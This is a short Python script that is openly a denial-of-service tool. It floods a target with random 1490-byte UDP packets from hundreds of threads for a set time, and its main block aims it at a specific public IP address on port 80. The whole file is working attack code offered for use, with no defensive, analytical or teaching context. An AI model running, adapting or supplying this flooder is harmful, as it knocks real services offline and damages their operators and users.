#!/usr/bin/env python3
#coding: utf8

import socket, random, time
from time import sleep
from threading import Thread, Lock, activeCount

def ddos(ip, thread=39*3, port=80, time=39*3):
    global sent, stop

    stop = False
    
    def Deamon(long):
        global stop
        print("[DDOS] {}".format(long))
        sleep(int(long))
        stop = True

    Thread(target=Deamon, args=(time,)).start()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte = random._urandom(1490)
    if port == "":
         port = 1
         re = True
    else:
         port = int(port)
         re = False

    sent = 0
    class Loop(Thread):
        def __init__(self, port, ip, thread):
            Thread.__init__(self)
            self.ip = ip
            self.port = port
            self.thread = thread

        def run(self):
            global sent
            sock.sendto(byte, (self.ip, self.port))
            sent = sent + 1
            print("[DDOS] Thread{thread}: Sent {num} packet to {target} throught port {port}.\n".format(
                 thread = self.thread,
                 num = str(sent),
                 target = ip,
                 port = str(self.port)
                 ),
                 end = ""
                 )

    class Main(Thread):
        def __init__(self, ip, thread, port):
            Thread.__init__(self)
            self.port = port
            self.ip = ip
            self.thread = thread
            
        def run(self):
            limit = 39*3*3*3
            total = 0
            global stop
            while True:
                if activeCount() < limit:
                    Loop(ip=self.ip, thread=self.thread, port=self.port).start()
                    total = total +1
                    if stop:
                        return

    for i in range(1, thread):
        Main(ip=ip, thread=i, port=port).start()

if __name__ == "__main__":
    ddos("222.90.68.34", port=80, thread=39*3)
